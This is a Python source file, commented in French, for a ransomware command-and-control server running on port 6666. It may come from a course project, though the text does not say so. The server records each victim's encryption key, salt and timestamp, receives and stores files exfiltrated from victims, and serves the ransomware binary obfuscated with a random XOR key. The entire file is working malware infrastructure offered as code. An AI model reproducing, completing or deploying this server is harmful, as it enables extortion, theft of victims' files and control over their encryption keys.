import base64
from hashlib import sha256
from http.server import HTTPServer
import os
from xor_crypt import xor_crypt 

from cncbase import CNCBase

class CNC(CNCBase):
    # Définir les chemins pour les dossiers racine du serveur CNC et du ransomware
    ROOT_PATH = "/root/CNC"
    RANSOMWARE_PATH = "/root/dist"

    def save_b64(self, token:str, data:str, filename:str):
        # Fonction d'aide pour sauvegarder les données décodées depuis Base64
        # Les paramètres token et data sont des chaînes Base64

        # Décode les données en Base64
        bin_data = base64.b64decode(data)
        # Crée le chemin du fichier en fonction du token et du nom du fichier
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        # Ouvre et écrit les données décodées dans le fichier
        with open(path, "wb") as f:
            f.write(bin_data)

    def get_ping(self, path: str, params: dict, body: dict) -> dict:
        # Fonction pour vérifier si le serveur est en ligne, renvoie un statut "OK"
        return {"status": "OK"}

    def post_new(self, path: str, params: dict, body: dict) -> dict:
        # Fonction pour créer un nouveau dossier avec les informations du client
        # Calcule le hachage SHA256 du token
        token = sha256(base64.b64decode(body["token"])).hexdigest()
        # Décode les données du sel, de la clé et du timestamp en Base64
        salt = base64.b64decode(body["salt"])
        key = base64.b64decode(body["key"])
        timestamp = base64.b64decode(body["timestamp"])

        # Crée un nouveau dossier avec le hachage du token
        token_dir = os.path.join(self.ROOT_PATH, token)
        os.makedirs(token_dir, exist_ok=True)

        # Sauvegarde les données du sel, de la clé et du timestamp dans des fichiers binaires
        with open(os.path.join(token_dir, "salt.bin"), "wb") as salt_file:
            salt_file.write(salt)

        with open(os.path.join(token_dir, "key.bin"), "wb") as key_file:
            key_file.write(key)

        with open(os.path.join(token_dir, "timestamp.bin"), "wb") as timestamp_file:
            timestamp_file.write(timestamp)

        return {"status": "OK"}

    def post_file(self, path: str, params: dict, body: dict) -> dict:
        # Fonction pour sauvegarder les fichier de la victime sur le serveur
        token = params["token"]
        file_data = body["file_data"]
        file_name = body["file_name"]
        # Retire le caractère de séparation de chemin initial
        original_path = body["original_path"][1:]

        # Crée le chemin du dossier pour les fichier
        token_dir = os.path.join(self.ROOT_PATH, token, "file", original_path)
        os.makedirs(token_dir, exist_ok=True)

        # Crée le chemin du fichier
        file_path = os.path.join(token_dir, file_name)
        # Ouvre et écrit les données décodées en Base64 dans le fichier
        with open(file_path, "wb") as f:
            f.write(base64.b64decode(file_data))

        return {"status": "OK"}
    
    def get_ransomware(self, path: str, params: dict, body: dict) -> dict:
        # Fonction pour récupérer le ransomware chiffré avec une clé XOR aléatoire
        with open(os.path.join(self.RANSOMWARE_PATH, "ransomware"), "rb") as f:
            # Génère une clé aléatoire pour l'obfuscation
            key = os.urandom(32)
            # Crypte le fichier avec la clé XOR aléatoire
            file = xor_crypt(f.read(), key)
            # Renvoie le fichier chiffré et la clé XOR sous forme de chaînes Base64
            return {"status": "OK", "data": base64.b64encode(file).decode(), "key": base64.b64encode(key).decode()}

# Crée et démarre le serveur HTTP sur le port 6666
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()